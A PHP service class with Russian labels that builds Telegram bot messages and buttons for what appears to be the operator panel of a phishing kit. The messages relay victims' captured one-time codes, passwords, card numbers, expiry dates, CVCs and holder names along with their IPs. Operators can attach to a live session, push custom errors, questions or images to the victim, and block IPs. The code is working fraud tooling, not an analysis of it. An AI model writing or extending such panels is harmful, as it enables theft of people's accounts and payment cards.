<?php

declare(strict_types=1);

namespace App\Services;

use App\Enums\ActionType;
use App\Models\BlockedIp;
use App\Models\Session;
use SergiX44\Nutgram\Telegram\Types\Keyboard\InlineKeyboardButton;

/**
 * Builds telegram text and keyboard for session messages.
 */
class TelegramSessionMessageBuilder
{
    public function formatSessionMessage(Session $session): string
    {
        $statusEmoji = $session->status->emoji();
        $statusLabel = $session->status->label();

        $inputEmoji = $session->input_type->emoji();
        $inputLabel = $session->input_type->label();

        $countryFlag = $session->country_code ? $this->countryCodeToFlag($session->country_code) : '';
        $countryInfo = $countryFlag;
        if ($session->country_name) {
            $countryInfo .= " {$session->country_name}";
        }

        $onlineStatus = $this->isSessionOnline($session) ? '🟢 Онлайн' : '🔴 Оффлайн';

        $inputLine = "{$inputEmoji} {$inputLabel}: <code>{$session->input_value}</code>";
        if ($session->input_type->value === 'phone' && $countryFlag) {
            $inputLine = "{$countryFlag} {$inputLabel}: <code>{$session->input_value}</code>";
        }

        $lines = [
            '📋 <b>Новая сессия</b>',
            '',
            $inputLine,
            "🌐 IP: <code>{$session->ip}</code>".($countryInfo ? " | {$countryInfo}" : ''),
            "{$statusEmoji} Статус: {$statusLabel}",
            "👁 Вкладка: {$onlineStatus}",
        ];

        if ($session->admin) {
            $adminName = $session->admin->username
                ? "@{$session->admin->username}"
                : (string) $session->admin->telegram_user_id;
            $lines[] = "👤 Админ: {$adminName}";
        }

        if ($session->action_type) {
            $actionEmoji = $session->action_type->emoji();
            $actionLabel = $session->action_type->label();
            $lines[] = "{$actionEmoji} Действие: {$actionLabel}";
        }

        $hasData = $session->code || $session->password || $session->card_number;
        if ($hasData) {
            $lines[] = '';
            $lines[] = '📥 <b>Полученные данные:</b>';
        }

        if ($session->code) {
            $lines[] = "🔢 Код: <code>{$session->code}</code>";
        }

        if ($session->password) {
            $lines[] = "🔐 Пароль: <code>{$session->password}</code>";
        }

        if ($session->card_number) {
            $lines[] = "💳 Карта: <code>{$session->card_number}</code>";

            if ($session->expire) {
                $lines[] = "├ Срок: <code>{$session->expire}</code>";
            }

            if ($session->cvc) {
                $lines[] = "├ CVC: <code>{$session->cvc}</code>";
            }

            if ($session->holder_name) {
                $lines[] = "└ Держатель: <code>{$session->holder_name}</code>";
            }
        }

        if ($session->phone_number && $session->input_type->value !== 'phone') {
            $phoneFlag = $countryFlag ?: '📞';
            $lines[] = "{$phoneFlag} Телефон: <code>{$session->phone_number}</code>";
        }

        if ($session->custom_error_text) {
            $lines[] = '';
            $lines[] = '❌ <b>Кастомная ошибка:</b>';
            $lines[] = "<i>{$session->custom_error_text}</i>";
        }

        if ($session->custom_image_url && $session->custom_question_text) {
            $lines[] = '';
            $lines[] = '🖼❓ <b>Картинка с вопросом:</b>';
            $lines[] = "🖼 <a href=\"{$session->custom_image_url}\">Картинка</a>";
            $lines[] = "❓ <b>Вопрос:</b> <i>{$session->custom_question_text}</i>";

            if ($session->custom_answers && is_array($session->custom_answers)) {
                $answer = $session->custom_answers['answer'] ?? null;
                if ($answer) {
                    $lines[] = "💬 <b>Ответ:</b> <code>{$answer}</code>";
                }
            }
        } else {
            if ($session->custom_question_text) {
                $lines[] = '';
                $lines[] = "❓ <b>Вопрос:</b> <i>{$session->custom_question_text}</i>";
            }

            if ($session->custom_answers && is_array($session->custom_answers)) {
                if (! $session->custom_question_text) {
                    $lines[] = '';
                }
                $answer = $session->custom_answers['answer'] ?? null;
                if ($answer) {
                    $lines[] = "💬 <b>Ответ:</b> <code>{$answer}</code>";
                }
            }

            if ($session->custom_image_url && ! $session->custom_question_text) {
                $lines[] = '';
                $lines[] = "🖼 <b>Картинка:</b> <a href=\"{$session->custom_image_url}\">ссылка</a>";
            }
        }

        $lines[] = '';
        $lines[] = "📅 Создана: {$session->created_at->format('d.m.Y H:i:s')}";

        if ($session->last_activity_at) {
            $lines[] = "⏱ Активность: {$session->last_activity_at->format('H:i:s')}";
        }

        return implode("\n", $lines);
    }

    /**
     * @return array<int, array<int, InlineKeyboardButton>>
     */
    public function buildSessionKeyboard(Session $session): array
    {
        $keyboard = [];

        if ($session->isProcessing() && $session->hasAdmin()) {
            $actionButtons = [];

            foreach (ActionType::cases() as $action) {
                if ($action === ActionType::ONLINE) {
                    continue;
                }

                $actionButtons[] = InlineKeyboardButton::make(
                    text: "{$action->emoji()} {$action->label()}",
                    callback_data: "action:{$session->id}:{$action->value}",
                );
            }

            $keyboard = array_merge($keyboard, array_chunk($actionButtons, 3));

            $keyboard[] = [
                InlineKeyboardButton::make(
                    text: '🟢 Проверить онлайн',
                    callback_data: "action:{$session->id}:online",
                ),
            ];

            if (! empty($session->ip_address)) {
                $isBlocked = BlockedIp::isBlocked($session->ip_address);
                $keyboard[] = [
                    InlineKeyboardButton::make(
                        text: $isBlocked ? '🔓 Разблокировать IP' : '🚫 Заблокировать IP',
                        callback_data: $isBlocked
                            ? "unblock_ip:{$session->ip_address}"
                            : "block_ip:{$session->id}",
                    ),
                ];
            }

            $keyboard[] = [
                InlineKeyboardButton::make(
                    text: '🔓 Открепиться',
                    callback_data: "unassign:{$session->id}",
                ),
                InlineKeyboardButton::make(
                    text: '✅ Завершить',
                    callback_data: "complete:{$session->id}",
                ),
            ];
        }

        if ($session->isPending()) {
            $keyboard[] = [
                InlineKeyboardButton::make(
                    text: '🔒 Прикрепиться',
                    callback_data: "assign:{$session->id}",
                ),
            ];

            if (! empty($session->ip_address)) {
                $isBlocked = BlockedIp::isBlocked($session->ip_address);
                $keyboard[] = [
                    InlineKeyboardButton::make(
                        text: $isBlocked ? '🔓 Разблокировать IP' : '🚫 Заблокировать IP',
                        callback_data: $isBlocked
                            ? "unblock_ip:{$session->ip_address}"
                            : "block_ip:{$session->id}",
                    ),
                ];
            }
        }

        return $keyboard;
    }

    private function countryCodeToFlag(string $code): string
    {
        $code = strtoupper($code);
        if (strlen($code) !== 2) {
            return '🌍';
        }

        $flag = '';
        for ($i = 0; $i < 2; $i++) {
            $char = ord($code[$i]);
            if ($char < ord('A') || $char > ord('Z')) {
                return '🌍';
            }
            $flag .= mb_chr(0x1F1E6 + $char - ord('A'));
        }

        return $flag;
    }

    private function isSessionOnline(Session $session, int $thresholdSeconds = 30): bool
    {
        if ($session->last_activity_at === null) {
            return false;
        }

        return $session->last_activity_at->diffInSeconds(now()) < $thresholdSeconds;
    }
}
